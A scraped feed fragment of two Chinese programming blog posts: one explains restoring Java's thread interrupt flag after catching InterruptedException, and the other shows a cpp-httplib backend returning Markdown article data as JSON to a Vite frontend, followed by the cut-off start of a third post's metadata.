            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/578781641968972/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    想用offer打牌
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:55:43.000Z" title="Fri Jan 02 2026 07:55:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.8;font-weight:400;font-size:16px;word-spacing:2px;letter-spacing:2px;overflow-x:hidden;color:#3e3e3e;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{padding-bottom:12px;font-size:24px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:1.2em;border-bottom:2px solid #ef7060;word-spacing:0!important;letter-spacing:0!important;font-size:inherit;line-height:inherit;display:block;font-weight:400;background:#ef7060;color:#fff;padding:10px;border-top-right-radius:3px;border-top-left-radius:3px;margin-right:3px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>在很多开源代码中都会看到<code>Thread.currentThread().interrupt()</code>这串代码，可是你真的了解它有什么用处吗？今天我们就一起来看看这串代码到底是干嘛的。</p>
<p>以下这串代码是Spring AI Alibaba的<code>ModelRetryInterceptor</code>类的片段。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">try</span> {
    log.info(<span class="hljs-string">"Retry after {} ms"</span>, currentDelay);
    Thread.sleep(currentDelay);
} <span class="hljs-keyword">catch</span> (InterruptedException e) {
    Thread.currentThread().interrupt();
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Retry interrupted"</span>, e);
}
</code></pre>
<h2 data-id="heading-1">消失的信号 -- 线程的中断标记位</h2>
<p>要理解这个问题，首先要明白 Java 的中断（Interruption）是一种<strong>协作机制</strong>，而不是强制命令。它依赖于线程对象内部的一个布尔标记位（Interrupt Status）。</p>
<p>当我们调用 <code>t.interrupt()</code> 时，仅仅是把这个标记位设为 <code>true</code>。</p>
<p>然而，Java 的阻塞库函数（如 <code>Thread.sleep()</code>, <code>Object.wait()</code>, <code>BlockingQueue.take()</code>）对中断非常敏感。它们的处理逻辑通常包含以下两个原子步骤：</p>
<ol>
<li><strong>检测到中断信号</strong>：发现中断标记位为 <code>true</code>。</li>
<li><strong>清除标记并抛出异常</strong>：为了响应这个中断，它们会<strong>先将标记位重置为 false</strong>，然后抛出 <code>InterruptedException</code>。</li>
</ol>
<p><strong>这就是问题的核心：</strong> 当你捕获到 <code>InterruptedException</code> 时，线程的中断标记位已经被 JVM 自动“吃掉”了（重置为 <code>false</code>）。</p>
<p>如果你在 <code>catch</code> 块中什么都不做（Swallow the exception），或者只是简单打印日志，那么线程看起来就像从未被中断过一样。</p>
<h2 data-id="heading-2">结果 -- ”僵尸线程“</h2>
<p>让我们看一个典型的生产环境 Bug。假设你需要在一个线程中不断处理任务，直到线程池关闭：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 依靠中断状态来判断是否结束</span>
    <span class="hljs-keyword">while</span> (!Thread.currentThread().isInterrupted()) { 
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 模拟执行任务</span>
            doWork();
            <span class="hljs-comment">// 模拟阻塞</span>
            Thread.sleep(<span class="hljs-number">1000</span>); 
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            <span class="hljs-comment">//  错误做法：只是打印日志，没有恢复状态</span>
            System.out.println(<span class="hljs-string">"收到停止信号，但我把信号搞丢了..."</span>);
        }
    }
    System.out.println(<span class="hljs-string">"线程退出"</span>);
}
</code></pre>
<p><strong>发生了什么？</strong></p>
<ol>
<li>外部调用 <code>future.cancel(true)</code> 或 <code>executor.shutdownNow()</code>，发送中断信号。</li>
<li><code>sleep()</code> 此时被唤醒，它<strong>清除标志位</strong>（变回 <code>false</code>），抛出异常。</li>
<li>进入 <code>catch</code> 块，打印日志。</li>
<li>代码继续运行，回到 <code>while</code> 循环头部。</li>
<li>检查 <code>!isInterrupted()</code>，由于刚才标志位被清除了，这里返回 <code>true</code>（即认为没有被中断）。</li>
<li><strong>线程继续死循环执行</strong>，无法停止。</li>
</ol>
<p>这就是所谓的<strong>僵尸线程</strong>——你以为你把它杀死了，但它只是“震动”了一下（抛了个异常），然后像没事人一样继续跑。</p>
<h2 data-id="heading-3">正确的姿势 -- 恢复现场</h2>
<p>为了解决这个问题，我们需要在捕获异常后，<strong>手动恢复</strong>刚才丢失的中断状态。</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">while</span> (!Thread.currentThread().isInterrupted()) {
        <span class="hljs-keyword">try</span> {
            doWork();
            Thread.sleep(<span class="hljs-number">1000</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            System.out.println(<span class="hljs-string">"被中断，准备退出..."</span>);
            
            <span class="hljs-comment">// 正确做法：重新设置中断状态</span>
            Thread.currentThread().interrupt(); 
            
            <span class="hljs-comment">// 通常配合 break 跳出循环</span>
            <span class="hljs-keyword">break</span>; 
        }
    }
}
</code></pre>
<p>这行代码的作用就是告诉后续的代码（包括 <code>while</code> 判断，或者调用栈上层的代码）：“<strong>刚才发生过中断，虽然异常把标志位清除了，但我现在把它补回来。</strong> ”</p>
<p>那你可能有疑问？为啥我不直接抛出异常？你可以抛出异常，但是分场景来。</p>
<ul>
<li>
<p><strong>可以抛出时：</strong> 如果你的方法签名允许抛出（例如你写的是普通业务方法），那<strong>优先选择抛出异常</strong>，这是最正确的做法，让上层决定如何处理。</p>
</li>
<li>
<p><strong>不能抛出时：</strong> 在实现 <code>Runnable.run()</code> 接口时，<code>run</code> 方法的签名是固定的，<strong>不允许抛出受检异常</strong>。你必须在内部 <code>try-catch</code>。在这种情况下，你捕获了异常，就必须负责<strong>恢复状态</strong>，以便调用栈上层的代码能感知到“哦，原来有人想让我停止”</p>
</li>
</ul>
<h3 data-id="heading-4">时序问题</h3>
<p>我们通过一段代码来验证我们所说的问题，体验瞬间的变化：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">try</span> {
        System.out.println(<span class="hljs-string">"1. 准备睡觉"</span>);
        Thread.sleep(<span class="hljs-number">5000</span>);
    } <span class="hljs-keyword">catch</span> (InterruptedException e) {
        <span class="hljs-comment">// 当我们进入这里时，JVM 已经把标志位清除了</span>
        System.out.println(<span class="hljs-string">"3. 捕获异常，此时标志位是: "</span> + Thread.currentThread().isInterrupted()); <span class="hljs-comment">// 输出 false</span>
        
        <span class="hljs-comment">// 所以我们需要手动“恢复”</span>
        Thread.currentThread().interrupt();
        System.out.println(<span class="hljs-string">"4. 手动恢复后，标志位是: "</span> + Thread.currentThread().isInterrupted()); <span class="hljs-comment">// 输出 true</span>
    }
});

t.start();
Thread.sleep(<span class="hljs-number">100</span>); <span class="hljs-comment">// 确保子线程已经睡着了</span>

System.out.println(<span class="hljs-string">"2. 主线程调用 interrupt"</span>);
t.interrupt(); <span class="hljs-comment">// 这一瞬间，t 的标志位其实是 true，但很快就被 sleep 内部逻辑清除了</span>
</code></pre>
<p>假设线程 A 正在 <code>Thread.sleep(10000)</code>：</p>
<ol>
<li>
<p><strong>Step 1: 其他线程动作</strong> 其他线程调用 <code>threadA.interrupt()</code>。</p>
<ul>
<li><strong>结果：</strong> 此时，线程 A 的中断标志位瞬间变为 <strong><code>true</code></strong>。</li>
</ul>
</li>
<li>
<p><strong>Step 2: 线程 A (JVM 内部机制) 响应</strong> 线程 A 处于 <code>sleep</code> 状态，JVM 内部机制检测到了标志位变成了 <code>true</code>。</p>
</li>
<li>
<p><strong>Step 3: 清除状态 (关键步骤)</strong> JVM 决定唤醒线程 A。<strong>但在唤醒并抛出异常之前</strong>，JVM 会做一个动作：<strong>将中断标志位重置（清除）为 <code>false</code></strong>。</p>
<ul>
<li><em>为什么要清除？</em> 就像你设定了一个闹钟，闹钟响了（抛出异常），你醒来后第一件事是按下闹钟的停止键（清除标志），否则它会一直响。</li>
</ul>
</li>
<li>
<p><strong>Step 4: 抛出异常</strong> JVM 抛出 <code>InterruptedException</code>，控制权进入你的 <code>catch</code> 块。</p>
<ul>
<li><strong>结果：</strong> 当代码运行到 <code>catch</code> 块里面时，你如果去查 <code>isInterrupted()</code>，看到的就是 <strong><code>false</code></strong>。</li>
</ul>
</li>
</ol>
<h2 data-id="heading-5">总结</h2>
<p><strong>永远不要生吞（Swallow）中断异常</strong>，除非你明确知道你的线程设计就是为了忽略停止信号</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从后端获取数据传输到前端进行显示(cpp-httplib+Vditor+Handlebars)]]></title>    <link>https://juejin.cn/post/7589958976226541578</link>    <guid>https://juejin.cn/post/7589958976226541578</guid>    <pubDate>2026-01-02T05:56:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589958976226541578" data-draft-id="7589962224795680806" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从后端获取数据传输到前端进行显示(cpp-httplib+Vditor+Handlebars)"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-02T05:56:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="charlee44"/> <meta itemprop="url" content="https://juejin.cn/user/1117549770846872"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从后端获取数据传输到前端进行显示(cpp-httplib+Vditor+Handlebars)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1117549770846872/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    charlee44
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T05:56:21.000Z" title="Fri Jan 02 2026 05:56:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 引言</h2>
<p>在之前的文章中，笔者实现了一个渲染 Markdown 格式文章的网页前端 Vite 项目（参看<a href="https://link.juejin.cn?target=https%3A%2F%2Fcharlee44.com%2Fpost.html%3Fid%3D1f8bf6fca114499fb1db7e15e9777ac7" target="_blank" title="https://charlee44.com/post.html?id=1f8bf6fca114499fb1db7e15e9777ac7" ref="nofollow noopener noreferrer">《给 Markdown 渲染网页增加一个目录组件(Vite+Vditor+Handlebars)》</a>）,以及一个支持 Markdown格式数据的静态文件服务的后端项目（参看<a href="https://link.juejin.cn?target=https%3A%2F%2Fcharlee44.com%2Fpost.html%3Fid%3Dae7a9a676916493f8f73c6217273b7eb" target="_blank" title="https://charlee44.com/post.html?id=ae7a9a676916493f8f73c6217273b7eb" ref="nofollow noopener noreferrer">《使用cpp-httplib发布静态文件服务》</a>）。在这里，就将前端与后端打通，通过 cpp-httplib 提供的 API 接口动态返回 Markdown 文章数据，由前端 Vite 项目利用 Handlebars 模板与 Vditor 渲染引擎完成展示与交互。</p>
<h2 data-id="heading-1">2. 实现</h2>
<h3 data-id="heading-2">2.1 后端</h3>
<p>JSON 是 HTTP 传输中事实上的标准数据格式，尤其是在现代 Web API（特别是 RESTful API）中，因此我们将后端的接口改成返回 JSON 格式数据的接口。按照 RESTful API 风格，命名为 <code>/api/v1/post</code>，使用 HTTP 的 Get 方法。具体代码如下：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;httplib.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;filesystem&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;nlohmann/json.hpp&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"BlogData.h"</span></span>

<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> nlohmann;
<span class="hljs-keyword">namespace</span> fs = std::filesystem;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
  httplib::Server svr;

  std::u8string docRoot =
      <span class="hljs-string">u8"D:/Work/HttpServer/public/最小二乘问题详解1：线性最小二乘"</span>;

  svr.<span class="hljs-built_in">Get</span>(<span class="hljs-string">"/api/v1/post"</span>,
          [&amp;](<span class="hljs-type">const</span> httplib::Request&amp; req, httplib::Response&amp; res) {
            DataTransfer::BlogData blogData;

            {
              fs::path blogMetaJsonPath = fs::<span class="hljs-built_in">path</span>(docRoot) / <span class="hljs-string">"meta.json"</span>;
              nlohmann::json blogMetaJson;
              ifstream <span class="hljs-built_in">infile</span>(blogMetaJsonPath);
              infile &gt;&gt; blogMetaJson;
              blogData.blogMeta = blogMetaJson;
            }

            {
              fs::path blogContentPath =
                  fs::<span class="hljs-built_in">path</span>(docRoot) / <span class="hljs-string">u8"最小二乘问题详解1：线性最小二乘.md"</span>;
              std::ifstream <span class="hljs-built_in">file</span>(blogContentPath, std::ios::binary);

              std::string <span class="hljs-built_in">content</span>((std::<span class="hljs-built_in">istreambuf_iterator</span>&lt;<span class="hljs-type">char</span>&gt;(file)),
                                  std::<span class="hljs-built_in">istreambuf_iterator</span>&lt;<span class="hljs-type">char</span>&gt;());
              blogData.content = std::<span class="hljs-built_in">move</span>(content);
            }

            <span class="hljs-comment">// 构造响应 JSON</span>
            json response_data = blogData;

            <span class="hljs-comment">// 设置响应</span>
            res.<span class="hljs-built_in">set_header</span>(<span class="hljs-string">"Access-Control-Allow-Origin"</span>,
                           <span class="hljs-string">"http://127.0.0.1:8000"</span>);  <span class="hljs-comment">// 允许跨域</span>
            res.<span class="hljs-built_in">set_content</span>(response_data.<span class="hljs-built_in">dump</span>(), <span class="hljs-string">"application/json"</span>);
          });

  std::cout &lt;&lt; <span class="hljs-string">"Server listening on http://127.0.0.1:8080\n"</span>;
  svr.<span class="hljs-built_in">listen</span>(<span class="hljs-string">"0.0.0.0"</span>, <span class="hljs-number">8080</span>);

  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>这段代码的实现非常简单，分别读取元数据 <code>meta.json</code> 和 文章内容 <code>最小二乘问题详解1：线性最小二乘.md</code> 文件，组织成 JSON 格式，设置到 HTTP 响应的内容中并且返回。其中，用到 nlohmann/json 对 结构体对象序列化和反序列化（参考<a href="https://link.juejin.cn?target=https%3A%2F%2Fcharlee44.com%2Fpost.html%3Fid%3Dd5736f77509345b2a66a2de4a70beb31" target="_blank" title="https://charlee44.com/post.html?id=d5736f77509345b2a66a2de4a70beb31" ref="nofollow noopener noreferrer">《C++中JSON序列化和反序列化的实现》</a>）。</p>
<p>另外需要注意的就是跨域问题。由于前端项目与后端项目是分离的，因此它们处在不同的域中，前端要请求后端的资源，就会发生跨域问题。解决办法就是在 HTTP 的响应头中设置允许跨域的键和值：</p>
<pre><code class="hljs language-cpp" lang="cpp">res.<span class="hljs-built_in">set_header</span>(<span class="hljs-string">"Access-Control-Allow-Origin"</span>, <span class="hljs-string">"http://127.0.0.1:8000"</span>);  <span class="hljs-comment">// 允许跨域</span>
</code></pre>
<h3 data-id="heading-3">2.2 前端</h3>
<p>前端的修改就简单多了，只需要修改获取远端数据的接口就可以了：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-type">const</span> response = await <span class="hljs-built_in">fetch</span>(<span class="hljs-string">"http://127.0.0.1:8080/api/v1/post"</span>);
<span class="hljs-keyword">if</span> (!response.ok) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"网络无响应"</span>);
}
<span class="hljs-type">const</span> blogData = await response.<span class="hljs-built_in">json</span>();
<span class="hljs-comment">//...</span>
</code></pre>
<p>其实这也是前后端分离的优势，后端提供数据资源的获取，前端则负责数据的可视化。最终的效果如下所示：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7cde63e2f904fddaf447883f0d6b177~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhcmxlZTQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767938180&amp;x-signature=7Tr9g%2BpFk9K3t5H7gzjR6sPQu4Q%3D" alt="从后端访问数据到前端进行展示" loading="lazy"/></p>
<h2 data-id="heading-4">3. 其他</h2>
<p>以上就是一个最简单的前后端分离 Web 项目。任何复杂功能都可以在此基础上进行扩展，只需搭配相应的架构设计，以更好地支持具体业务需求。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdownload.csdn.net%2Fdownload%2Fcharlee44%2F92492805" target="_blank" title="https://download.csdn.net/download/charlee44/92492805" ref="nofollow noopener noreferrer">实现代码</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大数据-200 决策树信息增益详解：信息熵、ID3 选特征与 Python 最佳切分实现]]></title>    <link>https://juejin.cn/post/7590020026394296374</link>    <guid>https://juejin.cn/post/7590020026394296374</guid>    <pubDate>2026-01-02T06:12:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590020026394296374" data-draft-id="7589932422653853732" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大数据-200 决策树信息增益详解：信息熵、ID3 选特征与 Python 最佳切分实现"/> <meta itemprop="keywords" content="后端,大数据,机器学习"/> <meta itemprop="datePublished" content="2026-01-02T06:12:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="武子康"/> <meta 